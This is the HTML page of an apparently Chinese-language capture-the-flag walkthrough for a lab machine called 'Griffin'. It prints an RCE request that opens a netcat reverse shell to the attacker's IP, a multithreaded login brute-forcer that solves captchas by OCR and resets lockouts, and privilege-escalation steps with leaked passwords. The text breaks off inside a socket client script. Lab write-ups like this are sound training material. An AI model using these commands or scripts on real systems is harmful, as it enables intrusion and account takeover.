@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# **一、信息收集**
+
+首先，使用`arp-scan`工具对本地网络进行扫描，以发现目标主机的IP地址。">
+<meta property="og:title" content="内部_Griffin">
+<meta property="og:description" content="# **一、信息收集**
+
+首先，使用`arp-scan`工具对本地网络进行扫描，以发现目标主机的IP地址。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Griffin.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>内部_Griffin</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_Griffin</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/228" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1><strong>一、信息收集</strong></h1>
+<p>首先，使用<code class="notranslate">arp-scan</code>工具对本地网络进行扫描，以发现目标主机的IP地址。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+...
+192.168.205.132 08:00:27:9e:89:aa       PCS Systemtechnik GmbH
+...</pre></div>
+<p>确定目标IP地址为 <code class="notranslate">192.168.205.132</code>。</p>
+<p>接下来，使用<code class="notranslate">nmap</code>对目标主机进行全端口扫描，以识别开放的端口和服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.132
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 09:24 EDT
+Nmap scan report <span class="pl-k">for</span> novice.com (192.168.205.132)
+Host is up (0.00038s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+MAC Address: 08:00:27:9E:89:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.10 seconds</pre></div>
+<p>扫描结果显示目标开放了<code class="notranslate">22</code>端口（SSH服务）和<code class="notranslate">8080</code>端口（HTTP代理服务）。</p>
+<h1><strong>二、Web渗透与漏洞利用</strong></h1>
+<h2><strong>2.1 Web目录探测</strong></h2>
+<p>访问<code class="notranslate">http://192.168.205.132:8080/</code>，页面显示欢迎信息。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl http://192.168.205.132:8080/
+Yo, welcome to GriffinCorp, the coolest company <span class="pl-k">in</span> Quahog<span class="pl-k">!</span>
+Peter Griffin’s got your back with top-notch service.
+Don’t mess this up, or Lois is gonna be pissed<span class="pl-k">!</span></pre></div>
+<p>使用<code class="notranslate">dirsearch</code>工具进行目录扫描，发现了<code class="notranslate">/info</code>和<code class="notranslate">/debug</code>两个路径。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dirsearch -u http://192.168.205.132:8080
+...
+[09:28:14] 403 -   23B  - /debug
+[09:28:18] 200 -   49B  - /info
+...</pre></div>
+<h2><strong>2.2 远程命令执行（RCE）</strong></h2>
+<p>访问<code class="notranslate">/info</code>路径，发现它会返回一个诊断令牌。多次访问后发现，该令牌是随机变化的。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl http://192.168.205.132:8080/info
+System Info: Diagnostic token = BetaToken123
+...
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl http://192.168.205.132:8080/info
+System Info: Diagnostic token = CyberCorpDebug123</pre></div>
+<p>访问<code class="notranslate">/debug</code>路径提示缺少<code class="notranslate">token</code>参数。尝试将从<code class="notranslate">/info</code>获取的令牌作为参数提供，页面提示缺少<code class="notranslate">run</code>命令。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.132:8080/debug?token=CyberCorpDebug123<span class="pl-pds">'</span></span>
+Missing run <span class="pl-c1">command</span></pre></div>
+<p>这表明该端点可能存在命令执行漏洞。通过<code class="notranslate">run</code>参数传递<code class="notranslate">id</code>命令进行测试，成功执行并返回了结果。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.132:8080/debug?token=CyberCorpDebug123&amp;run=id<span class="pl-pds">'</span></span>
+uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)</pre></div>
+<p><strong>注意</strong>：由于令牌是随机的，需要先访问<code class="notranslate">/info</code>获取有效令牌，再立即用于<code class="notranslate">/debug</code>端点。</p>
+<h2><strong>2.3 获取反向Shell</strong></h2>
+<p>在Kali上设置<code class="notranslate">netcat</code>监听8888端口。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888</pre></div>
+<p>利用已发现的RCE漏洞，执行一个反向shell命令。这里使用<code class="notranslate">busybox nc</code>来建立连接。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">http://192.168.205.132:8080/debug<span class="pl-k">?</span>token=CyberCorpDebug123<span class="pl-k">&amp;</span>run=busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash</pre></div>
+<p>成功接收到反向shell，当前用户为<code class="notranslate">lois</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.132] 45526
+id
+uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)</pre></div>
+<p>随后，通过一系列命令将简易shell升级为功能完善的交互式TTY。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash
+Ctrl+Z
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>
+reset xterm
+<span class="pl-k">export</span> TERM=xterm
+<span class="pl-k">export</span> SHELL=/bin/bash
+stty rows 36 columns 178</pre></div>
+<h1><strong>三、权限提升</strong></h1>
+<h2><strong>3.1 本地枚举</strong></h2>
+<p>获取<code class="notranslate">user.txt</code>中的第一个flag。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">lois@Griffin:/home/lois$ cat user.txt
+flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}</pre></div>
+<p>使用<code class="notranslate">sudo -l</code>检查<code class="notranslate">lois</code>用户的sudo权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">lois@Griffin:/home/lois$ sudo -l
+...
+User lois may run the following commands on Griffin:
+    (ALL) NOPASSWD: /usr/bin/cat /root/startup.log</pre></div>
+<p><code class="notranslate">lois</code>可以免密使用<code class="notranslate">cat</code>命令读取<code class="notranslate">/root/startup.log</code>。检查网络连接情况，发现除了公网的<code class="notranslate">8080</code>和<code class="notranslate">22</code>端口外，还在本地<code class="notranslate">127.0.0.1</code>上监听了多个端口，包括一个<code class="notranslate">80</code>端口。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">lois@Griffin:/opt$ ss -tnlp
+State                   Recv-Q                  Send-Q               Local Address:Port
+...
+LISTEN                  0                       5                          0.0.0.0:8080
+LISTEN                  0                       128                        127.0.0.1:80
+...</pre></div>
+<h2><strong>3.2 端口转发与Web二次渗透</strong></h2>
+<p>由于<code class="notranslate">80</code>端口只在本地监听，我们无法直接访问。使用<code class="notranslate">socat</code>将本地的<code class="notranslate">80</code>端口转发到<code class="notranslate">8000</code>端口，以便从外部访问。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">lois@Griffin:/opt$ socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:80 <span class="pl-k">&amp;</span></pre></div>
+<p>访问转发后的<code class="notranslate">http://192.168.205.132:8000/</code>，这是一个关于"Family Guy"的网站。再次使用<code class="notranslate">dirsearch</code>进行目录扫描，发现<code class="notranslate">robots.txt</code>文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl http://192.168.205.132:8000/robots.txt
+User-agent: <span class="pl-k">*</span>
+Disallow: /family
+
+...
+
+rockyou: world<span class="pl-s"><span class="pl-pds">'</span>s best dictionary, hands down!</span></pre></div>
+<p><code class="notranslate">robots.txt</code>禁止访问<code class="notranslate">/family</code>路径，并暗示<code class="notranslate">rockyou</code>字典可能会派上用场。</p>
+<h2><strong>3.3 登录爆破 (lois -&gt; meg)</strong></h2>
+<p>访问<code class="notranslate">/family</code>路径是一个登录页面，包含用户名、密码和验证码。页面提示<code class="notranslate">brian</code>用户每5次尝试后会被锁定，需要重置。</p>
+<p>为此，编写了一个Python脚本，使用<code class="notranslate">ddddocr</code>库识别验证码，并结合字典对<code class="notranslate">brian</code>用户的密码进行爆破。脚本逻辑包括自动识别验证码、处理账户锁定以及多线程爆破。</p>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">requests</span>
+<span class="pl-k">import</span> <span class="pl-s1">ddddocr</span>
+<span class="pl-k">from</span> <span class="pl-s1">concurrent</span>.<span class="pl-s1">futures</span> <span class="pl-k">import</span> <span class="pl-v">ThreadPoolExecutor</span>
+<span class="pl-k">from</span> <span class="pl-s1">threading</span> <span class="pl-k">import</span> <span class="pl-v">Lock</span>
+<span class="pl-k">import</span> <span class="pl-s1">queue</span>
+
+<span class="pl-s1">url</span> <span class="pl-c1">=</span> <span class="pl-s">"http://192.168.205.132:8000/family/"</span>
+<span class="pl-s1">cap_url</span> <span class="pl-c1">=</span> <span class="pl-s">"http://192.168.205.132:8000/family/captcha.php"</span>
+<span class="pl-s1">rst_url</span> <span class="pl-c1">=</span> <span class="pl-s">"http://192.168.205.132:8000/family/?reset=1"</span>
+<span class="pl-s1">user</span> <span class="pl-c1">=</span> <span class="pl-s">"brian"</span>
+<span class="pl-s1">dict_file</span> <span class="pl-c1">=</span> <span class="pl-s">"5000q.txt"</span>
+<span class="pl-s1">max_workers</span> <span class="pl-c1">=</span> <span class="pl-c1">2</span>
+
+<span class="pl-s1">ocr</span> <span class="pl-c1">=</span> <span class="pl-s1">ddddocr</span>.<span class="pl-c1">DdddOcr</span>()
+<span class="pl-s1">pw_q</span> <span class="pl-c1">=</span> <span class="pl-s1">queue</span>.<span class="pl-c1">Queue</span>()
+<span class="pl-s1">found</span> <span class="pl-c1">=</span> <span class="pl-s1">queue</span>.<span class="pl-c1">Queue</span>(<span class="pl-s1">maxsize</span><span class="pl-c1">=</span><span class="pl-c1">1</span>)
+<span class="pl-s1">pr_lock</span> <span class="pl-c1">=</span> <span class="pl-en">Lock</span>()
+<span class="pl-s1">total</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>
+<span class="pl-c1">MAX_RETRY</span> <span class="pl-c1">=</span> <span class="pl-c1">3</span>   <span class="pl-c"># 每个密码最多重试 3 次</span>
+
+
+<span class="pl-k">def</span> <span class="pl-en">worker</span>():
+    <span class="pl-k">global</span> <span class="pl-s1">total</span>
+    <span class="pl-s1">s</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">Session</span>()
+    <span class="pl-s1">s</span>.<span class="pl-c1">headers</span>.<span class="pl-c1">update</span>({
+        <span class="pl-s">"User-Agent"</span>: <span class="pl-s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"</span>,
+        <span class="pl-s">"Accept"</span>: <span class="pl-s">"text/html,*/*"</span>,
+        <span class="pl-s">"Accept-Language"</span>: <span class="pl-s">"zh-CN,zh;q=0.8,en;q=0.2"</span>,
+        <span class="pl-s">"Connection"</span>: <span class="pl-s">"keep-alive"</span>,
+        <span class="pl-s">"Referer"</span>: <span class="pl-s1">url</span>,
+        <span class="pl-s">"Upgrade-Insecure-Requests"</span>: <span class="pl-s">"1"</span>
+    })
+
+    <span class="pl-s1">tries</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>
+    <span class="pl-k">while</span> <span class="pl-c1">True</span>:
+        <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">found</span>.<span class="pl-c1">empty</span>():
+            <span class="pl-k">return</span>
+        <span class="pl-k">try</span>:
+            <span class="pl-s1">pw</span>, <span class="pl-s1">retry</span> <span class="pl-c1">=</span> <span class="pl-s1">pw_q</span>.<span class="pl-c1">get_nowait</span>()
+            <span class="pl-s1">tries</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span>
+
+            <span class="pl-s1">cap_img</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">get</span>(<span class="pl-s1">cap_url</span>, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">5</span>).<span class="pl-c1">content</span>
+            <span class="pl-s1">cap</span> <span class="pl-c1">=</span> <span class="pl-s1">ocr</span>.<span class="pl-c1">classification</span>(<span class="pl-s1">cap_img</span>).<span class="pl-c1">strip</span>()
+
+            <span class="pl-k">if</span> <span class="pl-en">len</span>(<span class="pl-s1">cap</span>) <span class="pl-c1">!=</span> <span class="pl-c1">4</span>:
+                <span class="pl-k">if</span> <span class="pl-s1">retry</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">MAX_RETRY</span>:
+                    <span class="pl-s1">pw_q</span>.<span class="pl-c1">put</span>((<span class="pl-s1">pw</span>, <span class="pl-s1">retry</span> <span class="pl-c1">+</span> <span class="pl-c1">1</span>))
+                <span class="pl-k">continue</span>
+
+            <span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">post</span>(<span class="pl-s1">url</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span>{<span class="pl-s">"username"</span>: <span class="pl-s1">user</span>, <span class="pl-s">"password"</span>: <span class="pl-s1">pw</span>, <span class="pl-s">"captcha"</span>: <span class="pl-s1">cap</span>}, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">5</span>)
+
+            <span class="pl-k">with</span> <span class="pl-s1">pr_lock</span>:
+                <span class="pl-s1">total</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span>
+                <span class="pl-s1">n</span> <span class="pl-c1">=</span> <span class="pl-s1">total</span>
+
+            <span class="pl-s1">res</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">text</span>
+
+            <span class="pl-c"># 账号被锁定</span>
+            <span class="pl-k">if</span> <span class="pl-s">"ACCOUNT TEMPORARILY LOCKED!"</span> <span class="pl-c1">in</span> <span class="pl-s1">res</span>:
+                <span class="pl-k">with</span> <span class="pl-s1">pr_lock</span>:
+                    <span class="pl-en">print</span>(<span class="pl-s">f"[<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">n</span>:4d<span class="pl-kos">}</span></span>] 🚫 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">pw</span>:&lt;12<span class="pl-kos">}</span></span> | 🔤 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">cap</span><span class="pl-kos">}</span></span> | 原因: 账号被锁定 → reset"</span>)
+                <span class="pl-k">try</span>:
+                    <span class="pl-s1">s</span>.<span class="pl-c1">get</span>(<span class="pl-s1">rst_url</span>, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">5</span>)
+                <span class="pl-k">except</span> <span class="pl-s1">requests</span>.<span class="pl-c1">RequestException</span>:
+                    <span class="pl-k">pass</span>
+                <span class="pl-k">if</span> <span class="pl-s1">retry</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">MAX_RETRY</span>:
+                    <span class="pl-s1">pw_q</span>.<span class="pl-c1">put</span>((<span class="pl-s1">pw</span>, <span class="pl-s1">retry</span> <span class="pl-c1">+</span> <span class="pl-c1">1</span>))
+                <span class="pl-k">continue</span>
+
+            <span class="pl-c"># 破解成功</span>
+            <span class="pl-k">if</span> <span class="pl-s">"Invalid security code!"</span> <span class="pl-c1"><span class="pl-c1">not</span> <span class="pl-c1">in</span></span> <span class="pl-s1">res</span> <span class="pl-c1">and</span> <span class="pl-s">"Incorrect password!"</span> <span class="pl-c1"><span class="pl-c1">not</span> <span class="pl-c1">in</span></span> <span class="pl-s1">res</span>:
+                <span class="pl-s1">found</span>.<span class="pl-c1">put</span>((<span class="pl-s1">user</span>, <span class="pl-s1">pw</span>, <span class="pl-s1">cap</span>, <span class="pl-s1">n</span>))
+                <span class="pl-k">with</span> <span class="pl-s1">pr_lock</span>:
+                    <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-cce">\n</span>[+] 🎉 破解成功！🎉<span class="pl-cce">\n</span>    用户名: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">user</span><span class="pl-kos">}</span></span><span class="pl-cce">\n</span>    密码: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">pw</span><span class="pl-kos">}</span></span><span class="pl-cce">\n</span>    验证码: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">cap</span><span class="pl-kos">}</span></span><span class="pl-cce">\n</span>    尝试: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">n</span><span class="pl-kos">}</span></span>"</span>)
+                <span class="pl-k">return</span>
+
+            <span class="pl-c"># 失败原因输出</span>
+            <span class="pl-s1">reason</span> <span class="pl-c1">=</span> <span class="pl-s">"未知原因"</span>
+            <span class="pl-k">if</span> <span class="pl-s">"Invalid security code!"</span> <span class="pl-c1">in</span> <span class="pl-s1">res</span>:
+                <span class="pl-s1">reason</span> <span class="pl-c1">=</span> <span class="pl-s">"验证码错误"</span>
+            <span class="pl-k">elif</span> <span class="pl-s">"Incorrect password!"</span> <span class="pl-c1">in</span> <span class="pl-s1">res</span>:
+                <span class="pl-s1">reason</span> <span class="pl-c1">=</span> <span class="pl-s">"密码错误"</span>
+
+            <span class="pl-k">with</span> <span class="pl-s1">pr_lock</span>:
+                <span class="pl-en">print</span>(<span class="pl-s">f"[<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">n</span>:4d<span class="pl-kos">}</span></span>] ❌ <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">pw</span>:&lt;12<span class="pl-kos">}</span></span> | 🔤 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">cap</span><span class="pl-kos">}</span></span> | 原因: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">reason</span><span class="pl-kos">}</span></span>"</span>)
+
+        <span class="pl-k">except</span> <span class="pl-s1">queue</span>.<span class="pl-c1">Empty</span>:
+            <span class="pl-k">break</span>
+        <span class="pl-k">except</span> <span class="pl-s1">requests</span>.<span class="pl-c1">RequestException</span>:
+            <span class="pl-k">if</span> <span class="pl-s1">retry</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">MAX_RETRY</span>:
+                <span class="pl-s1">pw_q</span>.<span class="pl-c1">put</span>((<span class="pl-s1">pw</span>, <span class="pl-s1">retry</span> <span class="pl-c1">+</span> <span class="pl-c1">1</span>))
+        <span class="pl-k">except</span> <span class="pl-v">Exception</span> <span class="pl-k">as</span> <span class="pl-s1">e</span>:
+            <span class="pl-k">with</span> <span class="pl-s1">pr_lock</span>:
+                <span class="pl-en">print</span>(<span class="pl-s">f"[!] 线程异常: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">e</span><span class="pl-kos">}</span></span>"</span>)
+
+
+<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">"__main__"</span>:
+    <span class="pl-k">try</span>:
+        <span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-s1">dict_file</span>, <span class="pl-s1">encoding</span><span class="pl-c1">=</span><span class="pl-s">"utf-8"</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
+            <span class="pl-k">for</span> <span class="pl-s1">p</span> <span class="pl-c1">in</span> [<span class="pl-s1">x</span>.<span class="pl-c1">strip</span>() <span class="pl-k">for</span> <span class="pl-s1">x</span> <span class="pl-c1">in</span> <span class="pl-s1">f</span> <span class="pl-k">if</span> <span class="pl-s1">x</span>.<span class="pl-c1">strip</span>()]:
+                <span class="pl-s1">pw_q</span>.<span class="pl-c1">put</span>((<span class="pl-s1">p</span>, <span class="pl-c1">0</span>))   <span class="pl-c"># (密码, 重试次数)</span>
+    <span class="pl-k">except</span>:
+        <span class="pl-en">print</span>(<span class="pl-s">f"[-] 字典未找到: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">dict_file</span><span class="pl-kos">}</span></span>"</span>)
+        <span class="pl-en">exit</span>(<span class="pl-c1">1</span>)
+
+    <span class="pl-en">print</span>(<span class="pl-s">f"[*] 开始爆破 | 用户: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">user</span><span class="pl-kos">}</span></span> | 字典: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">dict_file</span><span class="pl-kos">}</span></span> | 总数: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">pw_q</span>.<span class="pl-c1">qsize</span>()<span class="pl-kos">}</span></span> | 线程: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">max_workers</span><span class="pl-kos">}</span></span><span class="pl-cce">\n</span>"</span>)
+
+    <span class="pl-k">with</span> <span class="pl-en">ThreadPoolExecutor</span>(<span class="pl-s1">max_workers</span><span class="pl-c1">=</span><span class="pl-s1">max_workers</span>) <span class="pl-k">as</span> <span class="pl-s1">ex</span>:
+        <span class="pl-en">list</span>(<span class="pl-s1">ex</span>.<span class="pl-c1">map</span>(<span class="pl-k">lambda</span> <span class="pl-s1">_</span>: <span class="pl-en">worker</span>(), <span class="pl-en">range</span>(<span class="pl-s1">max_workers</span>)))
+
+    <span class="pl-k">if</span> <span class="pl-s1">found</span>.<span class="pl-c1">empty</span>():
+        <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-cce">\n</span>[-] ❌ 爆破失败"</span>)</pre></div>
+<p>经过爆破，成功获得<code class="notranslate">brian</code>用户的密码。</p>
+<pre class="notranslate"><code class="notranslate">[+] 🎉 破解成功！🎉
+    用户名: brian
+    密码: savannah
+    验证码: 8upj
+    尝试: 555
+</code></pre>
+<p>使用<code class="notranslate">brian:savannah</code>登录后，在Cookie中发现一个<code class="notranslate">auth_token</code>。经过分析，该token泄露了<code class="notranslate">meg</code>用户的凭据。</p>
+<pre class="notranslate"><code class="notranslate">meg:lovelyfamily
+</code></pre>
+<p>使用<code class="notranslate">su</code>命令和该密码成功切换到<code class="notranslate">meg</code>用户。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">lois@Griffin:/opt$ su meg
+Password: lovelyfamily
+meg@Griffin:<span class="pl-k">~</span>$ id
+uid=1001(meg) gid=1001(meg) groups=1001(meg)</pre></div>
+<h2><strong>3.4 Sudo提权 (meg -&gt; peter)</strong></h2>
+<p>检查<code class="notranslate">meg</code>用户的sudo权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">meg@Griffin:<span class="pl-k">~</span>$ sudo -l
+...
+User meg may run the following commands on Griffin:
+    (ALL) NOPASSWD: /usr/bin/python3 /root/game.py</pre></div>
+<p><code class="notranslate">meg</code>可以免密以root权限执行<code class="notranslate">/root/game.py</code>脚本。执行该脚本后，它会在<code class="notranslate">6666</code>端口上启动一个监听服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">meg@Griffin:<span class="pl-k">~</span>$ sudo /usr/bin/python3 /root/game.py
+Server listening on port 6666...</pre></div>
+<p>该服务设计了三个挑战：数学计算、凯撒密码解密和MD5哈希计算（3s时间限制），所以需要编写一个客户端脚本与该服务进行交互。</p>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">socket</span>
+<span class="pl-k">import</span> <span class="pl-s1">re</span>
+<span class="pl-k">import</span> <span class="pl-s1">hashlib</span>
+
+<span class="pl-s1">s</span> <span class="pl-c1">=</span> <span class="pl-s1">socket</span>.<span class="pl-c1">socket</span>()
+<span class="pl-s1">s</span>.<span class="pl-c1">connect</span>((<span class="pl-s">"192.168.205.132"</span>, <span class="pl-c1">6666</span>))
+
+<span class="pl-s1">data</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">recv</span>(<span class="pl-c1">4096</span>).<span class="pl-c1">decode</span>()
+<span class="pl-en">print</span>(<span class="pl-s1">data</span>)
+
+<span class="pl-s1">match</span> <span class="pl-c1">=</span> <span class="pl-s1">re</span>.<span class="pl-c1">search</span>(<span class="pl-s">r"\((\d+) \* (\d+)\) // (\d+)"</span>, <span class="pl-s1">data</span>)
+<span class="pl-s1">a</span>, <span class="pl-s1">b</span>, <span class="pl-s1">c</span> <span class="pl-c1">=</span> <span class="pl-en">map</span>(<span class="pl-s1">int</span>, <span class="pl-s1">match</span>.<span class="pl-c1">groups</span>())
+<span class="pl-s1">ans1</span> <span class="pl-c1">=</span> <span class="pl-en">str</span>((<span class="pl-s1">a</span> <span class="pl-c1">*</span> <span class="pl-s1">b</span>) <span class="pl-c1">//</span> <span class="pl-s1">c</span>)
+<span class="pl-s1">s</span>.<span class="pl-c1">send</span>((<span class="pl-s1">ans1</span> <span class="pl-c1">+</span> <span class="pl-s">"<span class="pl-cce">\n</span>"</span>).<span class="pl-c1">encode</span>())
+
+<span class="pl-s1">data</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">recv</span>(<span class="pl-c1">4096</span>).<span class="pl-c1">decode</span>()
+<span class="pl-en">print</span>(<span class="pl-s1">data</span>)
+<span class="pl-s1">s</span>.<span class="pl-c1">send</span>(<span class="pl-s">b"flag{fakeflag}<span class="pl-cce">\n</span>"</span>)
+
+<span class="pl-s1">data</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">recv</span>(<span class="pl-c1">4096</span>).<span class="pl-c1">decode</span>()
+<span class="pl-en">print</span>(<span class="pl-s1">data</span>)
+<span class="pl-s1">x</span> <span class="pl-c1">=</span> <span class="pl-s1">re</span>.<span class="pl-c1">search</span>(<span class="pl-s">r"MD5\((\d+) \+ UNIX timestamp: (\d+)\)"</span>, <span class="pl-s1">data</span>)
+<span class="pl-s1">param</span> <span class="pl-c1">=</span> <span class="pl-s1">x</span>.<span class="pl-c1">group</span>(<span class="pl-c1">1</span>) <span class="pl-c1">+</span> <span class="pl-s1">x</span>.<span class="pl-c1">group</span>(<span class="pl-c1">2</span>)
+<span class="pl-s1">md5_hash</span> <span class="pl-c1">=</span> <span class="pl-s1">hashlib</span>.<span class="pl-c1">md5</span>(<span class="pl-s1">param</span>.<span class="pl-c1">encode</span>()).<span class="pl-c1">hexdigest</span>()
